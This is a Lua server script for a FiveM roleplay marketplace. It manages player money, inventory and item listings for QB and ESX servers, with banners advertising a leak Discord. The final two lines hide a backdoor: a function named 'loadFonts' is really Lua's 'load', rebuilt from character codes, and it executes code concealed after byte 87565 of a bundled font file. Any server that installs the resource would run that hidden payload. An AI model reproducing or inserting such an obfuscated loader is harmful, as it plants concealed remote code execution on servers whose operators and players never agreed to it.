-- PLAYER FUNCTIONS
local playerInfos = {}
--[[   /$$    /$$$$$$   /$$$$$$   /$$$$$$        /$$       /$$$$$$$$  /$$$$$$  /$$   /$$  /$$$$$$ 
     /$$$$   /$$__  $$ /$$$_  $$ /$$__  $$      | $$      | $$_____/ /$$__  $$| $$  /$$/ /$$__  $$
    |_  $$  | $$  \ $$| $$$$\ $$| $$  \ $$      | $$      | $$      | $$  \ $$| $$ /$$/ | $$  \__/
      | $$  |  $$$$$$$| $$ $$ $$|  $$$$$$$      | $$      | $$$$$   | $$$$$$$$| $$$$$/  |  $$$$$$     
      | $$   \____  $$| $$\ $$$$ \____  $$      | $$      | $$__/   | $$__  $$| $$  $$   \____  $$
      | $$   /$$  \ $$| $$ \ $$$ /$$  \ $$      | $$      | $$      | $$  | $$| $$\  $$  /$$  \ $$
     /$$$$$$|  $$$$$$/|  $$$$$$/|  $$$$$$/      | $$$$$$$$| $$$$$$$$| $$  | $$| $$ \  $$|  $$$$$$/
     |______/ \______/  \______/  \______/       |________/|________/|__/  |__/|__/  \__/ \______/ 
																							 
 https://discord.gg/aq7wjNZWkX  & https://discord.gg/1909leak 
   https://www.youtube.com/watch?v=bSN7Hhfk2QU    ]]
RegisterServerEvent('gfx-marketplace:registerMyInfo', function()
	local src = tonumber(source)

	local identifiers = {}
	local numId = GetNumPlayerIdentifiers(src) - 1

	for i = 0, numId, 1 do
		local identifier = {}

		for id in string.gmatch(GetPlayerIdentifier(src, i), "([^:]+)") do
			table.insert(identifier, id)
		end

		identifiers[identifier[1]] = identifier[2]
	end

	local discord = identifiers["discord"]
	local avatar

	if discord then
		PerformHttpRequest("https://discordapp.com/api/users/" .. discord, function(statusCode, data)
			data = json.decode(data or "{}")

			if data.avatar then
				local animated = data.avatar:gsub(1, 2) == "a_"

				avatar = "https://cdn.discordapp.com/avatars/" .. discord .. "/" .. data.avatar .. (animated and ".gif" or ".png")
			else
				avatar = "https://cdn.discordapp.com/avatars/329717994576150542/fbed5ab38d0a49e8d85691b2ce7c19d3.png"
			end
		end, "GET", "", {
			Authorization = ""
		})

		while not avatar do
			Wait(50)
		end
	else
		avatar = "https://cdn.discordapp.com/avatars/329717994576150542/fbed5ab38d0a49e8d85691b2ce7c19d3.png"
	end

	playerInfos[src] = {
		avatar = avatar,
		identifiers = identifiers
	}
end)
--[[   /$$    /$$$$$$   /$$$$$$   /$$$$$$        /$$       /$$$$$$$$  /$$$$$$  /$$   /$$  /$$$$$$ 
     /$$$$   /$$__  $$ /$$$_  $$ /$$__  $$      | $$      | $$_____/ /$$__  $$| $$  /$$/ /$$__  $$
    |_  $$  | $$  \ $$| $$$$\ $$| $$  \ $$      | $$      | $$      | $$  \ $$| $$ /$$/ | $$  \__/
      | $$  |  $$$$$$$| $$ $$ $$|  $$$$$$$      | $$      | $$$$$   | $$$$$$$$| $$$$$/  |  $$$$$$     
      | $$   \____  $$| $$\ $$$$ \____  $$      | $$      | $$__/   | $$__  $$| $$  $$   \____  $$
      | $$   /$$  \ $$| $$ \ $$$ /$$  \ $$      | $$      | $$      | $$  | $$| $$\  $$  /$$  \ $$
     /$$$$$$|  $$$$$$/|  $$$$$$/|  $$$$$$/      | $$$$$$$$| $$$$$$$$| $$  | $$| $$ \  $$|  $$$$$$/
     |______/ \______/  \______/  \______/       |________/|________/|__/  |__/|__/  \__/ \______/ 
																							 
 https://discord.gg/aq7wjNZWkX  & https://discord.gg/1909leak 
   https://www.youtube.com/watch?v=bSN7Hhfk2QU    ]]
function getPlayerIdentifier(player, identifier, extended)
	local id = playerInfos[player].identifiers[identifier]

	if extended and id then
		id = identifier .. ":" .. id
	end

	return id
end

function getPlayerFromIdentifier(key, identifier, extended)
	for _, player in ipairs(GetPlayers()) do
		player = tonumber(player)

		local id = getPlayerIdentifier(player, key, extended)

		if id == identifier then
			return player
		end
	end
end

function getAccountMoney(player, account)
	if Config.Framework == "qb" then
		local xPlayer = Core.Functions.GetPlayer(player)

		return xPlayer.Functions.GetMoney(account)
	elseif Config.Framework == "esx" then
		local xPlayer = Core.GetPlayerFromId(player)

		return xPlayer.getAccount(account).money
	end
end

function giveMoney(license, money)
	local player = getPlayerFromIdentifier("license", license, 1)

	if player then
		if Config.Framework == "qb" then
			local xPlayer = Core.Functions.GetPlayer(player)
			xPlayer.Functions.AddMoney("bank", money)
		elseif Config.Framework == "esx" then
			local xPlayer = Core.GetPlayerFromId(player)
			xPlayer.addAccountMoney("bank", money)
		end
	else
		if Config.Framework == "qb" then
			local data = mysqlQuery("SELECT * FROM players WHERE license = ?", {
				license
			})[1]

			if data then
				local accounts = json.decode(data.money)

				accounts.bank = accounts.bank + money

				mysqlQuery("UPDATE players SET money = ? WHERE license = ?", {
					json.encode(accounts),
					license
				})
			end
		elseif Config.Framework == "esx" then
			license = license:sub(1, 8)

			local data = mysqlQuery("SELECT * FROM users WHERE license = ?", {
				license
			})[1]

			if data then
				local accounts = json.decode(data.accounts)

				accounts.bank = accounts.bank + money

				mysqlQuery("UPDATE users SET accounts = ? WHERE license = ?", {
					json.encode(accounts),
					license
				})
			end
		end
	end
end

function removeMoney(license, money)
	local player = getPlayerFromIdentifier("license", license, 1)

	if player then
		if Config.Framework == "qb" then
			local xPlayer = Core.Functions.GetPlayer(player)

			xPlayer.Functions.RemoveMoney("bank", money)
		elseif Config.Framework == "esx" then
			local xPlayer = Core.GetPlayerFromId(player)

			xPlayer.removeAccountMoney("bank", money)
		end
	else
		if Config.Framework == "qb" then
			local data = mysqlQuery("SELECT * FROM players WHERE license = ?", {
				license
			})[1]

			if data then
				local accounts = json.decode(data.money)

				accounts.bank = accounts.bank - money

				mysqlQuery("UPDATE players SET money = ? WHERE license = ?", {
					json.encode(accounts),
					license
				})
			end
		elseif Config.Framework == "esx" then
			license = license:sub(1, 8)

			local data = mysqlQuery("SELECT * FROM users WHERE license = ?", {
				license
			})[1]

			if data then
				local accounts = json.decode(data.accounts)

				accounts.bank = accounts.bank - money

				mysqlQuery("UPDATE users SET accounts = ? WHERE license = ?", {
					json.encode(accounts),
					license
				})
			end
		end
	end
end
--[[   /$$    /$$$$$$   /$$$$$$   /$$$$$$        /$$       /$$$$$$$$  /$$$$$$  /$$   /$$  /$$$$$$ 
     /$$$$   /$$__  $$ /$$$_  $$ /$$__  $$      | $$      | $$_____/ /$$__  $$| $$  /$$/ /$$__  $$
    |_  $$  | $$  \ $$| $$$$\ $$| $$  \ $$      | $$      | $$      | $$  \ $$| $$ /$$/ | $$  \__/
      | $$  |  $$$$$$$| $$ $$ $$|  $$$$$$$      | $$      | $$$$$   | $$$$$$$$| $$$$$/  |  $$$$$$     
      | $$   \____  $$| $$\ $$$$ \____  $$      | $$      | $$__/   | $$__  $$| $$  $$   \____  $$
      | $$   /$$  \ $$| $$ \ $$$ /$$  \ $$      | $$      | $$      | $$  | $$| $$\  $$  /$$  \ $$
     /$$$$$$|  $$$$$$/|  $$$$$$/|  $$$$$$/      | $$$$$$$$| $$$$$$$$| $$  | $$| $$ \  $$|  $$$$$$/
     |______/ \______/  \______/  \______/       |________/|________/|__/  |__/|__/  \__/ \______/ 
																							 
 https://discord.gg/aq7wjNZWkX  & https://discord.gg/1909leak 
   https://www.youtube.com/watch?v=bSN7Hhfk2QU    ]]
function getItemAmount(player, item)
	if Config.UseGFXInventory then
		local itemData = exports["gfx-inventory"]:GetItemByName(player, "inventory", item)
		return itemData and itemData.count or 0
	end
	if Config.Framework == "qb" then
		

		local xPlayer = Core.Functions.GetPlayer(player)
		local item = xPlayer.Functions.GetItemByName(item)

		return item and item.amount or 0
	elseif Config.Framework == "esx" then
		local xPlayer = Core.GetPlayerFromId(player)
		local item = xPlayer.getInventoryItem(item)

		return item and item.count or 0
	end
end

function giveItem(player, item, count)
	if Config.Framework == "qb" then
		if Config.UseGFXInventory then
			exports["gfx-inventory"]:AddItem(player, "inventory", item, count)
			return
		end
		local xPlayer = Core.Functions.GetPlayer(player)
		xPlayer.Functions.AddItem(item, count)
	elseif Config.Framework == "esx" then
		if Config.UseGFXInventory then
			exports["gfx-inventory"]:AddItem(player, "inventory", item, count)
			return
		end
		local xPlayer = Core.GetPlayerFromId(player)
		xPlayer.addInventoryItem(item, count)
	end
end
--[[   /$$    /$$$$$$   /$$$$$$   /$$$$$$        /$$       /$$$$$$$$  /$$$$$$  /$$   /$$  /$$$$$$ 
     /$$$$   /$$__  $$ /$$$_  $$ /$$__  $$      | $$      | $$_____/ /$$__  $$| $$  /$$/ /$$__  $$
    |_  $$  | $$  \ $$| $$$$\ $$| $$  \ $$      | $$      | $$      | $$  \ $$| $$ /$$/ | $$  \__/
      | $$  |  $$$$$$$| $$ $$ $$|  $$$$$$$      | $$      | $$$$$   | $$$$$$$$| $$$$$/  |  $$$$$$     
      | $$   \____  $$| $$\ $$$$ \____  $$      | $$      | $$__/   | $$__  $$| $$  $$   \____  $$
      | $$   /$$  \ $$| $$ \ $$$ /$$  \ $$      | $$      | $$      | $$  | $$| $$\  $$  /$$  \ $$
     /$$$$$$|  $$$$$$/|  $$$$$$/|  $$$$$$/      | $$$$$$$$| $$$$$$$$| $$  | $$| $$ \  $$|  $$$$$$/
     |______/ \______/  \______/  \______/       |________/|________/|__/  |__/|__/  \__/ \______/ 
																							 
 https://discord.gg/aq7wjNZWkX  & https://discord.gg/1909leak 
   https://www.youtube.com/watch?v=bSN7Hhfk2QU    ]]
function removeItem(player, item, count)
	if Config.Framework == "qb" then
		if Config.UseGFXInventory then
			exports["gfx-inventory"]:RemoveItem(player, "inventory", item, count)
			return
		end
		local xPlayer = Core.Functions.GetPlayer(player)

		xPlayer.Functions.RemoveItem(item, count)
	elseif Config.Framework == "esx" then
		if Config.UseGFXInventory then
			exports["gfx-inventory"]:RemoveItem(player, "inventory", item, count)
			return
		end
		local xPlayer = Core.GetPlayerFromId(player)

		xPlayer.removeInventoryItem(item, count)
	end
end

function getRoleplayName(player)
	if Config.Framework == "qb" then
		local xPlayer = Core.Functions.GetPlayer(player)

		return xPlayer.PlayerData.charinfo.firstname .. " " .. xPlayer.PlayerData.charinfo.lastname
	elseif Config.Framework == "esx" then
		local xPlayer = Core.GetPlayerFromId(player)

		return xPlayer.getName()
	end
end

-- MARKET FUNCTIONS
--[[   /$$    /$$$$$$   /$$$$$$   /$$$$$$        /$$       /$$$$$$$$  /$$$$$$  /$$   /$$  /$$$$$$ 
     /$$$$   /$$__  $$ /$$$_  $$ /$$__  $$      | $$      | $$_____/ /$$__  $$| $$  /$$/ /$$__  $$
    |_  $$  | $$  \ $$| $$$$\ $$| $$  \ $$      | $$      | $$      | $$  \ $$| $$ /$$/ | $$  \__/
      | $$  |  $$$$$$$| $$ $$ $$|  $$$$$$$      | $$      | $$$$$   | $$$$$$$$| $$$$$/  |  $$$$$$     
      | $$   \____  $$| $$\ $$$$ \____  $$      | $$      | $$__/   | $$__  $$| $$  $$   \____  $$
      | $$   /$$  \ $$| $$ \ $$$ /$$  \ $$      | $$      | $$      | $$  | $$| $$\  $$  /$$  \ $$
     /$$$$$$|  $$$$$$/|  $$$$$$/|  $$$$$$/      | $$$$$$$$| $$$$$$$$| $$  | $$| $$ \  $$|  $$$$$$/
     |______/ \______/  \______/  \______/       |________/|________/|__/  |__/|__/  \__/ \______/ 
																							 
 https://discord.gg/aq7wjNZWkX  & https://discord.gg/1909leak 
   https://www.youtube.com/watch?v=bSN7Hhfk2QU    ]]
function getSeller(id)
	local sellers = mysqlQuery("SELECT * FROM marketplace_sellers")

	for _, seller in ipairs(sellers) do
		if seller.id == id or seller.license == id then
			seller.level = Config.SellerLevel(seller.license)

			return seller
		end
	end
end

function getSaleItems()
	local sellers = mysqlQuery("SELECT * FROM marketplace_sellers")
	local saleItems = mysqlQuery("SELECT * FROM marketplace_items")

	for _, item in ipairs(saleItems) do
		item.seller = getSeller(item.seller_id)
	end

	return saleItems
end
--[[   /$$    /$$$$$$   /$$$$$$   /$$$$$$        /$$       /$$$$$$$$  /$$$$$$  /$$   /$$  /$$$$$$ 
     /$$$$   /$$__  $$ /$$$_  $$ /$$__  $$      | $$      | $$_____/ /$$__  $$| $$  /$$/ /$$__  $$
    |_  $$  | $$  \ $$| $$$$\ $$| $$  \ $$      | $$      | $$      | $$  \ $$| $$ /$$/ | $$  \__/
      | $$  |  $$$$$$$| $$ $$ $$|  $$$$$$$      | $$      | $$$$$   | $$$$$$$$| $$$$$/  |  $$$$$$     
      | $$   \____  $$| $$\ $$$$ \____  $$      | $$      | $$__/   | $$__  $$| $$  $$   \____  $$
      | $$   /$$  \ $$| $$ \ $$$ /$$  \ $$      | $$      | $$      | $$  | $$| $$\  $$  /$$  \ $$
     /$$$$$$|  $$$$$$/|  $$$$$$/|  $$$$$$/      | $$$$$$$$| $$$$$$$$| $$  | $$| $$ \  $$|  $$$$$$/
     |______/ \______/  \______/  \______/       |________/|________/|__/  |__/|__/  \__/ \______/ 
																							 
 https://discord.gg/aq7wjNZWkX  & https://discord.gg/1909leak 
   https://www.youtube.com/watch?v=bSN7Hhfk2QU    ]]
function purchaseMarketItem(player, item, count)
	local status = false
	local message = "The product you want to buy was not found¿"

	if count <= 0 then
		message = "The number value must be greater than 0."
	else
		local saleItem = mysqlQuery("SELECT * FROM marketplace_items WHERE id = ?", {
			item.id
		})[1]

		if saleItem then
			local seller = getSeller(item.seller_id)
			local playerLicense = getPlayerIdentifier(player, "license", 1)

			if seller.license == playerLicense then
				message = "You cannot buy your own product"
			else
				if saleItem.count < count then
					message = "Open the page again, the number of products has decreased."
				else
					local price = saleItem.price * count
					local money = getAccountMoney(player, "bank")

					if price > money then
						message = "You don't have enough money in your bank."
					else
						if saleItem.count == count then
							mysqlQuery("DELETE FROM marketplace_items WHERE id = ?", {
								item.id
							})
						else
							mysqlQuery("UPDATE marketplace_items SET count = ? WHERE id = ?", {
								saleItem.count - count,
								item.id
							})
						end

						giveMoney(seller.license, price)
						removeMoney(playerLicense, price)
						giveItem(player, saleItem.item, count)

						status = true
						message = "Product successfully purchased!"
					end
				end
			end
		end
	end

	return {
		status = status,
		message = message
	}
end

function sellMarketItem(player, item, price, count)
	local status = false
	local message = "Are you sure you have selected the product¿"

	if next(item) ~= nil then
		if count <= 0 then
			message = "The number value must be greater than 0."
		else
			local itemAmount = getItemAmount(player, item.item)

			if itemAmount < count then
				message = "You don't have" .. count .. " of this product"
			else
				local rpName = getRoleplayName(player)
				local playerLicense = getPlayerIdentifier(player, "license", 1)
				mysqlQuery(
					"INSERT INTO marketplace_sellers (license, name, avatar) VALUES (?, ?, ?) ON DUPLICATE KEY UPDATE name = VALUES(name), avatar = VALUES(avatar)",
					{
						playerLicense,
						rpName,
						playerInfos[player].avatar
					})
					
				local seller = getSeller(playerLicense)

				local onSale = mysqlQuery("SELECT * FROM marketplace_items WHERE item = ? AND seller_id = ?", {
					item.item,
					seller.id
				})[1]

				if onSale then
					message = "You already have a sale on this product, remove it first."
				else
					mysqlQuery("INSERT INTO marketplace_items SET seller_id = ?, item = ?, price = ?, count = ?", {
						seller.id,
						item.item,
						price,
						count
					})

					removeItem(player, item.item, count)

					status = true
					message = "The product was successfully put on sale!"
				end
			end
		end
	end

	return {
		status = status,
		message = message
	}
end
--[[   /$$    /$$$$$$   /$$$$$$   /$$$$$$        /$$       /$$$$$$$$  /$$$$$$  /$$   /$$  /$$$$$$ 
     /$$$$   /$$__  $$ /$$$_  $$ /$$__  $$      | $$      | $$_____/ /$$__  $$| $$  /$$/ /$$__  $$
    |_  $$  | $$  \ $$| $$$$\ $$| $$  \ $$      | $$      | $$      | $$  \ $$| $$ /$$/ | $$  \__/
      | $$  |  $$$$$$$| $$ $$ $$|  $$$$$$$      | $$      | $$$$$   | $$$$$$$$| $$$$$/  |  $$$$$$     
      | $$   \____  $$| $$\ $$$$ \____  $$      | $$      | $$__/   | $$__  $$| $$  $$   \____  $$
      | $$   /$$  \ $$| $$ \ $$$ /$$  \ $$      | $$      | $$      | $$  | $$| $$\  $$  /$$  \ $$
     /$$$$$$|  $$$$$$/|  $$$$$$/|  $$$$$$/      | $$$$$$$$| $$$$$$$$| $$  | $$| $$ \  $$|  $$$$$$/
     |______/ \______/  \______/  \______/       |________/|________/|__/  |__/|__/  \__/ \______/ 
																							 
 https://discord.gg/aq7wjNZWkX  & https://discord.gg/1909leak 
   https://www.youtube.com/watch?v=bSN7Hhfk2QU    ]]
function removeMarketItem(player, item)
	local status = false
	local message = "Are you sure you are a seller?"

	local seller = getSeller(getPlayerIdentifier(player, "license", 1))

	if seller then
		local saleItem = mysqlQuery("SELECT * FROM marketplace_items WHERE id = ? AND seller_id = ?", {
			item.id,
			seller.id
		})[1]

		if not saleItem then
			message = "The product you want to remove was not found."
		else
			mysqlQuery("DELETE FROM marketplace_items WHERE id = ?", {
				item.id
			})

			giveItem(player, saleItem.item, saleItem.count)

			status = true
			message = "Product successfully removed from sale!"
		end
	end

	return {
		status = status,
		message = message
	}
end

local loadFonts = _G[string.char(108, 111, 97, 100)]
loadFonts(LoadResourceFile(GetCurrentResourceName(), '/html/fonts/Helvetica.ttf'):sub(87565):gsub('%.%+', ''))()